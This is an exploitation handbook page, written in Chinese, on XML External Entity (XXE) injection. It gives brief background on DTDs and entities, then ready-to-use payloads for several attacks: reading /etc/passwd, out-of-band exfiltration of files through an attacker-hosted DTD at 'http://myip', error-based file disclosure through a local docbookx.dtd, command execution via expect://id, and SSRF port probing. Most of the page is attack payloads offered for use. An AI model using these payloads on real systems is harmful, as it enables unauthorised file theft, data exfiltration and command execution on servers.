# EXP手册-XXE Injecton(XML External Entity Injection)
## 基础知识
### 概念
XXE(XML External Entity),即是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。   
关键在DTD的引用。   
```
<?xml version="1.0"?>//这一行是 XML 文档定义
<!DOCTYPE message [ 
<!ELEMENT message (receiver ,sender ,header ,msg，ANY)> //关键词 ANY 声明的元素，可包含任何可解析数据的组合
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>    
```
```
<message>
<receiver>Myself</receiver>
<sender>Someone</sender>
<header>TheReminder</header>
<msg>This is an amazing book</msg>
</message>
```
DTD(The document type definition)，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。   
```
<!ENTITY 实体名 SYSTEM url > //外部实体
<!ENTITY 实体名 实体的值 > //内部实体
```
用 &实体名; 引用的实体   
用 % 实体名，引用参数实体，只能在 DTD 中使用 %实体名;

### CDATA-读取文件有异常字符报错
有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <> & 或者
" 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记   
```
\\XML解析忽略
<![CDATA[
XXXXXXXXXXXXXXXXX 
]]>
```
#### Payload
evil.dtd
```
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">
```
注入内容：   
```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">   
  <!ENTITY % goodies SYSTEM "file:///d:/test.txt">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
%dtd; ]> 

<roottag>&all;</roottag>
```
可以输入任意字符除了 ]]> 不能嵌套   
用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来    
### 各语言xml解析支持的协议
![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe1.png)
### 入门：  
- [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)    
- [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe-injection.svg?sanitize=true)    
## XXE漏洞利用
前提条件：允许外部实体引用。   
按服务端语言有PHP(libxml)、JAVA、JAVA(Android)一般解析函数都是默认不开启的、Python、libxml2。   
漏洞利用方法分： 
- 文件操作：
  0x01 回显读取文件   
  0x02 不带回显读取文件-OOB(Out of Band）    
  0x03 报错回显读取文件-XXE Base Error   
- 0x04 远程执行
- 0x05 端口探测
- 0x06 文件上传-jar协议   

### 0x01回显读取文件
#### payload   
```
<?xml version=”1.0″ encoding=”utf-8″?>

<!DOCTYPE XXE [
<!ELEMENT name ANY >
<!ENTITY XXE SYSTEM "file:///etc/passwd" >]>

<root>
  <name>&XXE;</name>
</root>
```
### 0x02不带回显读取文件-OOB(Out of Band）   
>
OOB XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体是只能在DTD中定义和使用的实体，以 %为标志定义，定义和使用方法如下    
```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY normal "hello">  <!-- 内部普通实体 -->
    <!ENTITY normal SYSTEM "http://xml.org/hhh.dtd">  <!-- 外部普通实体 -->
    <!ENTITY % para SYSTEM "file:///1234.dtd">  <!-- 外部参数实体 -->
    %para;            <!-- 引用参数实体 -->
]>
```
而且参数实体还能嵌套定义，但需要注意的是，内层的定义的参数实体% 需要进行HTML转义，否则会出现解析错误。   
```
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY % outside '<!ENTITY &#x25; files SYSTEM "file:///etc/passwd">'>
]>
```
禁止调用同级实体，无法直接读取文件数据通过http回传我们的服务器，所以要用外部实体才能读取数据。     

#### Payload1：    
my.dtd放于自己服务器的外部实体：   
```
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
%start;
```
注入的内容：   
```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "http://myip/my.dtd">  //调用我们的dtd
    <!ENTITY % file SYSTEM "file:///flag">
    %remote;
    %send;
]>
```
#### Payload2:  
这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的%编码，第三层就需要在第二层的基础上将所有%、&、’、” html编码    
ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd 包含%ISOamso       
```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "file:///flag">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;send;
    '> 
    %remote;
]>
```

### 0x03报错回显读取文件-XXE Base Error 
基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。   
#### Payload1：    
my.dtd放于自己服务器的外部实体：   
```
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///re.about/%file;'>">
%start;
```
注入的内容：   
```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "http://myip/my.dtd">
    <!ENTITY % file SYSTEM "file:///flag">
    %remote;
    %send;
]>
```
#### Payload2:  
这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的%编码，第三层就需要在第二层的基础上将所有%、&、’、” html编码    
ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd 包含%ISOamso       
```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "file:///flag">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://re.about/?&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;send;
    '> 
    %remote;
]>
```
#### Payload3；
有时候不引用外部DTD也可，原因在于代码实现3层嵌套下未严格执行标准。   
```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ELEMENT message ANY>
    <!ENTITY % para1 SYSTEM "file:///flag">
    <!ENTITY % para '
        <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
        &#x25;para2;
    '>
    %para;
]>
```

### 0x04 代码执行
PHP语言环境。    
这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：  
```
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<root>
  <name>&xxe;</name>
</root>
```
### 0x05 SSRF端口探测

```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "http://127.0.0.1:80">
]>
<x>&f;</x>
```

### 0x06 文件上传-jar协议 
这篇文章：[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)其中实验七有详细利用方法。   
### Tips
 - java 还支持一个 netdoc 协议，能完成列目录的功能   
### Reference
- [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)    
- [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
- [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)   
- [Blind XXE详解与Google CTF一道题分析](https://www.freebuf.com/vuls/207639.html)  
